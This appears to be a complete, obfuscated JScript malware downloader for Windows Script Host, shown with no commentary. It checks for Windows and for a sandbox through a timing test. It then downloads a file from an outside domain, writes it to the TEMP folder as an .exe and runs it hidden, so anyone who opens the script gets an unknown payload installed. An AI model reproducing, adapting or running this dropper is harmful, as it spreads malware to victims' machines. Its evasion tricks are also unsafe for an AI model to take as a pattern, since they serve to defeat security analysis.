var vQ = false;
var qG = "CreateObject";
var ir = function t() {return WScript[qG]("WScript.Shell");}(), CN = 11;
var x0 = "MSXML2.XMLHTTP";
var J = 2123213;
var AS = 0;
function s(FO){ir["Run"](FO, AS, AS);};
function L(){return "" + x0;};
function x(o0, G){AS = AS * 1; return o0 - G;};
function ae(){return qG;};
/*@cc_on
  @if (@_win32 || @_win64)
    vQ = true;
  @end
@*/
if (vQ)
{
var W = "";
function Hi(){return 22;};
var L0 = 0; var N = 0;
function o()
{
var z = new this["Date"]();
var zU = z["getUTCMilliseconds"]();
WScript["Sleep"](Hi());
var z = new this["Date"]();
var aD = z["getUTCMilliseconds"]();
WScript["Sleep"](Hi());
var z = new this["Date"]();
var m = z["getUTCMilliseconds"]();
var L0 = "Q";
L0 = x(aD, zU);
var N = "y";
N = x(m, aD);
W = "open";
return x(L0, N);
}
var Lg = false;
var dA = false;
for (var E = AS; E < Hi() * 1; E++){if (o() != AS){
Lg = true; 
N = "31" + 11 * L0 + N; 
dA = true; 
break;
}}
function e() {return ((Lg == true) && (Lg == dA)) ? 1 : AS;};
if (Lg && e() && dA){
function ta() {return ir["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "w2rLafksRJvJ.exe";};
 m0 = L();
 Zp = WScript[qG](m0);
 var F = 1;
 while (F){
try {
Zp[W]("GET", "http://refindsexy.com/i8eps", false);
Zp["send"]();
E0 = "Sleep";
for (;;){WScript[E0](Hi() * 11); if (Zp["readystate"] >= 2 * 2) break;};
F = AS;
} catch(I){};
}
function h(SA) {var tQ = (1, 2, 3, 4, 5, SA); return tQ;};
t0 = WScript[ae()]("ADODB.Stream");
m0 = t0;
m0[W]();
m0["type"] = h(1);
m0["write"](Zp["ResponseBody"]);
t0["position"] = h(AS);
m0["Save" + "ToFile"](ta(), 2);
t0["c"+"lose"]();
JS = ta();
s(JS);
}
}

